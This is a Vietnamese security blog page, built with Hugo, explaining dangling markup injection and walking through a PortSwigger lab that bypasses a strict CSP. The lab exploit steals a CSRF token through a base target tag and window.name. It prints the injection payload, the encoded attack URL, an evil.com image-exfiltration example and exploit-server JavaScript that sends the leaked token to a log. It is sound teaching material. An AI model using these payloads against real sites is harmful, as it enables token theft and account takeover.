@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Dangling Markup Attack | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+title: Dangling Markup Attack
+tag: Dangling Markup Attack
+Introduction
+
+Là một kỹ thuật khai thác lỗ hổng injection vào web, thường được sử dụng khi các phương pháp XSS truyền thống bị chặn bởi các cơ chế bảo mật như CSP hoặc bộ lọc đầu vào
+
+Tại sao browser lại nuốt dữ liệu?
+
+Web browser được thiết kế với tiêu chí khoan dung (error-tolerant). Khi gặp mã HTML bị lỗi (VD: thiếu dấu đóng ngoặc kép) thay vì báo lỗi và dừng hiển thị (như XML) trình duyệt sẽ cố gắng sửa lỗi để hiển thị nội dung tốt nhất có thể cho người dùng
+Cơ chế này hoạt động dựa trên state machine của trình phân tích cú pháp (HTML Parser). Khi trình duyệt gặp một thuộc tính mở (VD: &lt;img src=&quot;), nó chuyển sang trạng thái Attribute Value Double Quoted State
+
+Trình duyệt sẽ tiếp tục đọc mọi ký tự tiếp theo dưới dạng giá trị của thuộc tính cho đến khi nó tìm thấy dấu ngoặc kép đóng (&quot;) tương ứng
+Nó bỏ qua các dấu xuống dòng, các thẻ HTML khác, và cả các dữ liệu nhạy cảm nằm giữa thẻ mở của attacker và dấu ngoặc kép tiếp theo trong trang web =&gt; Dangling Markup
+
+
+
+Dangling Markup với CSP
+
+Trong XSS thông thường thì attacker thực thi mã JS (VD: &lt;script&gt;alert(1)&lt;/script&gt;). Nhưng nếu CSP chặn việc thực thi script hoặc chặn tải tài nguyên từ tên miền bên ngoài, XSS truyền thống sẽ vô hiệu
+Dangling Markup giải quyết vấn đề này bằng cách inject một tag HTML không đóng -&gt; unclosed tag
+Dangling Markup không thực thi mã. Nó biến cấu trúc DOM của trang web (bao gồm CSRF token, thông tin cá nhân) thành dữ liệu (VD: một phần của URL ảnh hoặc tên window).
+Vì đây là hành vi phân tích cú pháp HTML hợp lệ, CSP (vốn chỉ quản lý việc tải tài nguyên) thường không chặn được quá trình nuốt dữ liệu này.
+Việc không đóng tag khiến browser nuốt toàn bộ nội dung HTML phía sau điểm injection (cho đến khi gặp ký tự kết thúc phù hợp) và coi đấy là một phần của thuộc tính trong tag độc hại
+
+Case study (Được thực hiện trên Firefox)
+Reflected XSS protected by very strict CSP, with dangling markup attack
+Lấy CSRF Token để đổi email người dùng">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/web-security/dangling-markup-attack/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/web-security/dangling-markup-attack/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dangling Markup Attack
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><hr>
+<h2 id="tag-dangling-markup-attack">title: Dangling Markup Attack
+tag: Dangling Markup Attack</h2>
+<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
+<ul>
+<li>Là một kỹ thuật khai thác lỗ hổng injection vào web, thường được sử dụng khi các phương pháp XSS truyền thống bị chặn bởi các cơ chế bảo mật như CSP hoặc bộ lọc đầu vào</li>
+</ul>
+<h2 id="tại-sao-browser-lại-nuốt-dữ-liệu">Tại sao browser lại nuốt dữ liệu?<a hidden class="anchor" aria-hidden="true" href="#tại-sao-browser-lại-nuốt-dữ-liệu">#</a></h2>
+<ul>
+<li>Web browser được thiết kế với tiêu chí khoan dung (error-tolerant). Khi gặp mã HTML bị lỗi (VD: thiếu dấu đóng ngoặc kép) thay vì báo lỗi và dừng hiển thị (như XML) trình duyệt sẽ cố gắng sửa lỗi để hiển thị nội dung tốt nhất có thể cho người dùng</li>
+<li>Cơ chế này hoạt động dựa trên state machine của trình phân tích cú pháp (HTML Parser). Khi trình duyệt gặp một thuộc tính mở (VD: <code>&lt;img src=&quot;</code>), nó chuyển sang trạng thái <code>Attribute Value Double Quoted State</code>
+<ul>
+<li>Trình duyệt sẽ tiếp tục đọc mọi ký tự tiếp theo dưới dạng giá trị của thuộc tính cho đến khi nó tìm thấy dấu ngoặc kép đóng (<code>&quot;</code>) tương ứng</li>
+<li>Nó bỏ qua các dấu xuống dòng, các thẻ HTML khác, và cả các dữ liệu nhạy cảm nằm giữa thẻ mở của attacker và dấu ngoặc kép tiếp theo trong trang web =&gt; <strong>Dangling Markup</strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="dangling-markup-với-csp">Dangling Markup với CSP<a hidden class="anchor" aria-hidden="true" href="#dangling-markup-với-csp">#</a></h2>
+<ul>
+<li>Trong XSS thông thường thì attacker thực thi mã JS (VD: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>). Nhưng nếu CSP chặn việc thực thi script hoặc chặn tải tài nguyên từ tên miền bên ngoài, XSS truyền thống sẽ vô hiệu</li>
+<li>Dangling Markup giải quyết vấn đề này bằng cách inject một tag HTML không đóng -&gt; unclosed tag</li>
+<li>Dangling Markup không thực thi mã. Nó biến cấu trúc DOM của trang web (bao gồm <code>CSRF token</code>, thông tin cá nhân) thành dữ liệu (VD: một phần của URL ảnh hoặc tên window).</li>
+<li>Vì đây là hành vi phân tích cú pháp HTML hợp lệ, CSP (vốn chỉ quản lý việc tải tài nguyên) thường không chặn được quá trình nuốt dữ liệu này.</li>
+<li>Việc không đóng tag khiến browser nuốt toàn bộ nội dung HTML phía sau điểm injection (cho đến khi gặp ký tự kết thúc phù hợp) và coi đấy là một phần của thuộc tính trong tag độc hại</li>
+</ul>
+<h1 id="case-study-được-thực-hiện-trên-firefox">Case study (Được thực hiện trên Firefox)<a hidden class="anchor" aria-hidden="true" href="#case-study-được-thực-hiện-trên-firefox">#</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Reflected XSS protected by very strict CSP, with dangling markup attack</a>
+<strong>Lấy CSRF Token để đổi email người dùng</strong></p>
+<h2 id="recon-phân-tích-csp">Recon: Phân tích CSP<a hidden class="anchor" aria-hidden="true" href="#recon-phân-tích-csp">#</a></h2>
+<ul>
+<li>Khi kiểm tra HTTP response header cảu bài lab, ta thấy CSP rất chặt chẽ
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Skw5pbKL-x.png">
+<ul>
+<li><code>script-src 'self' 'nonce-...'</code>: chặn hoàn toàn thẻ <code>&lt;script&gt;</code> nếu không có nonce đúng. XSS truyền thống vô hiệu</li>
+<li><code>img-src 'self'</code>: đây là điểm mấu chốt. Kỹ thuật Dangling Markup cơ bản thường dùng thẻ <code>&lt;img&gt;</code> (VD: <code>&lt;img src='http://evil.com?log=...</code>). Tuy nhiên directive này bắt buộc ảnh chỉ được tải từ chính domain của trang web (<code>'self'</code>). Nếu ta inject thẻ <code>&lt;img&gt;</code> trỏ về server của attacker, trình duyệt sẽ chặn request ngay lập tức -&gt; không lấy được dữ liệu</li>
+</ul>
+</li>
+</ul>
+<p>Lỗ hổng trong CSP: chính sách trên thiếu directive <code>base-uri</code>. Điều này cho phép kẻ tấn công điều khiển thẻ <code>&lt;base&gt;</code>, thẻ này quy định URL gốc cho tất cả các liên kết tương đối và target (cửa sổ đích) của các liên kết</p>
+<h2 id="điểm-injection-và-dữ-liệu-mục-tiêu">Điểm injection và dữ liệu mục tiêu<a hidden class="anchor" aria-hidden="true" href="#điểm-injection-và-dữ-liệu-mục-tiêu">#</a></h2>
+<ul>
+<li>Điểm injection: chức năng <code>Update Email</code> hiển thị lại email cũ trên URL và trong thẻ input <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJ6R0ZYU-e.png">
+<ul>
+<li>URL: <code>https://0a8f008e04bc672d85eb4a97005600ea.web-security-academy.net/my-account?id=wiener&amp;email=injection_point</code></li>
+<li>HTML response: <code>&lt;input type=&quot;text&quot; name=&quot;email&quot; value=&quot;injection_point&quot;&gt;</code> <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1hEyGKUbl.png"></li>
+</ul>
+</li>
+<li>Dữ liệu nhạy cảm: token chống CSRF nằm ngay sau điểm injection <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1vqJGKUWe.png"></li>
+</ul>
+<pre tabindex="0"><code class="language-htmlembedded!" data-lang="htmlembedded!">&lt;form action=&#34;/my-account/change-email&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;text&#34; name=&#34;email&#34; value=&#34;&#34;&gt; &lt;!-- injection ở đây --&gt;
+    &lt;input required type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;SECRET_TOKEN&#34;&gt; &lt;!-- Mục tiêu --&gt;
+</code></pre><p>=&gt; Ta cần nuốt toàn bộ đoạn mã từ sau thẻ email đến hết thẻ csrf token</p>
+<h1 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
+<ul>
+<li>Do <code>img-src</code> bị chặn, ta sẽ sử dụng kỹ thuật Dangling Markup qua thẻ <code>&lt;base&gt;</code> kết hợp với <code>window.name</code></li>
+</ul>
+<h2 id="tạo-payload">Tạo payload<a hidden class="anchor" aria-hidden="true" href="#tạo-payload">#</a></h2>
+<ul>
+<li>Mục tiêu là chèn một thẻ <code>&lt;base target='</code>. Thuộc tính <code>target</code> quy định tên của cửa sổ (<code>window name</code>) khi người dùng nhấn vào <code>link</code>. Nếu ta không đóng ngoặc toàn bộ nội dung HTML phía sau sẽ trở thành tên của cửa sổ mới</li>
+</ul>
+<pre tabindex="0"><code class="language-htmlembedded!" data-lang="htmlembedded!">&#34;&gt;&lt;a href=&#34;[https://exploit_server.net/exploit](https://exploit_server.net/exploit)&#34;&gt;Click Me&lt;/a&gt;&lt;base target=&#34;
+</code></pre><ul>
+<li><code>&quot;&gt;</code>: đóng thẻ <code>&lt;input&gt;</code> và thuộc tính <code>value</code> hiện tại của victim để thoát ra ngoài</li>
+<li><code>&lt;a href=&quot;...&quot;&gt;Click Me&lt;/a&gt;</code>: tTạo mồi nhử, vì ta không thể dùng script để tự động chuyển trang hay dùng ảnh để tự động tải, ta cần người dùng tương tác (click).</li>
+<li><code>&lt;base target=&quot;</code>: bắt đầu tấn công Dangling. Dấu ngoặc kép mở sẽ nuốt mọi thứ phía sau cho đến khi gặp dấu ngoặc kép tiếp theo trong trang web gốc</li>
+</ul>
+<h2 id="data-flow-khi-payload-được-kích-hoạt">Data flow khi payload được kích hoạt<a hidden class="anchor" aria-hidden="true" href="#data-flow-khi-payload-được-kích-hoạt">#</a></h2>
+<ul>
+<li>
+<p>Khi victim truy cập URL chứa payload:
+<code>https://lab_id.web-security-academy.net/my-account?id=wiener&amp;email=%22%3E%3Ca%20href%3D%22https%3A%2F%2Fexploit_server.net%2Fexploit%22%3EClick%20Me%3C%2Fa%3E%3Cbase%20target%3D%22</code>
+(Ta có thể dùng Decoder trong Burp Suite để decode payload) <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/By0bGfYL-g.png"></p>
+</li>
+<li>
+<p>Browser sẽ hiểu DOM như sau:</p>
+</li>
+</ul>
+<pre tabindex="0"><code class="language-htmlembedded!" data-lang="htmlembedded!">    &lt;input ... value=&#34;&#34;&gt;
+    &lt;a href=&#34;[https://exploit_server.net/exploit](https://exploit_server.net/exploit)&#34;&gt;Click Me&lt;/a&gt;
+    &lt;base target=&#34;&gt;
+        &lt;input required type=&#39;hidden&#39; name=&#39;csrf&#39; value=&#39;TOKEN&#39;&gt;
+        &lt;button ...&gt; ... &lt;/form&gt; ...
+    &#34;&gt;
+</code></pre><ul>
+<li>Toàn bộ đoạn mã từ <code>&gt; &lt;input ... value='</code> trở thành giá trị của thuộc tính <code>target</code></li>
+<li>Giá trị này chứa <code>TOKEN</code></li>
+</ul>
+<h2 id="lấy-dữ-liệu-tại-server-attacker">Lấy dữ liệu tại server attacker<a hidden class="anchor" aria-hidden="true" href="#lấy-dữ-liệu-tại-server-attacker">#</a></h2>
+<ul>
+<li>Khi victim nhấn <code>Click me</code>
+<ul>
+<li>Trình duyệt mở link <code>https://exploit_server.net/exploit</code> trong một cửa sổ mới.</li>
+<li>Trình duyệt đặt tên cho cửa sổ mới (<code>window.name</code>) bằng chuỗi HTML đã bị nuốt ở trên.</li>
+<li>Tại exploit server ta dùng JS để đọc<code>window.name</code> và gửi về log</li>
+</ul>
+</li>
+</ul>
+<p>Code tại exploit server (File<code>/exploit</code>)</p>
+<pre tabindex="0"><code class="language-htmlembedded" data-lang="htmlembedded">&lt;body&gt;
+&lt;script&gt;
+    // window.name chứa CSRF token bị rò rỉ
+    // Gửi nó về log của attacker
+    fetch(&#39;/log?leak=&#39; + encodeURIComponent(window.name));
+&lt;/script&gt;
+&lt;/body&gt;
+</code></pre><h2 id="account-takeover">Account takeover<a hidden class="anchor" aria-hidden="true" href="#account-takeover">#</a></h2>
+<ul>
+<li>Lấy token: kiểm tra Access Log của exploit server, giải mã URL để tìm chuỗi <code>name='csrf' value='victim_token'</code></li>
+<li>Tạo CSRF Exploit: Sau khi có token, kẻ tấn công tạo một trang web độc hại thứ hai (hoặc sửa lại trang exploit cũ) để tự động đổi email của nạn nhân</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
